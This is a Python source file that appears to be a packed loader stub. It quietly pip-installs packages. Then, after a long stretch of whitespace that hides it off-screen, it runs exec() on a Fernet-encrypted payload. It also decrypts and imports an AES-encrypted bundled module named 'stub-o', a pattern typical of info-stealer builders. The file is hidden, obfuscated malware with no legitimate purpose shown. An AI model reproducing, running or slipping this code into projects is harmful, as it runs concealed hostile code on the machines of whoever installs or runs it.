import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'g9_zQNAWKs0vj83BAcbphDERXPaUIzhuK5x5N1DOKG8=').decrypt(b'gAAAAABlRWUgKJ3spn7ESWZw0k9ZsUzlcVJwRsEwD-WA7djid8yVgZFwqsc2E_cc4hHLG00o7ukU2E_lh-QQb4JvYmEBfV-4BxZjhFov7A5QoPsN4NKVSeWXCTokDIk8XxHq2TY3myUONGGl1JwX9sCWrQzV5y065_WS-BmDGNr3Hzn-qCjS9d4Mp2f-pvPG4q1isYC5ENNUwQ8EEvXWTDD8j08eKuPALw=='))
import os, sys, base64, zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter

zipfile = os.path.join(sys._MEIPASS, "blank.aes")
module = "stub-o"

key = base64.b64decode("%key%")
iv = base64.b64decode("%iv%")

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)

if os.path.isfile(zipfile):
    with open(zipfile, "rb") as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, iv, ciphertext)
    with open(zipfile, "wb") as f:
        f.write(decrypted)
    
    zipimporter(zipfile).load_module(module)
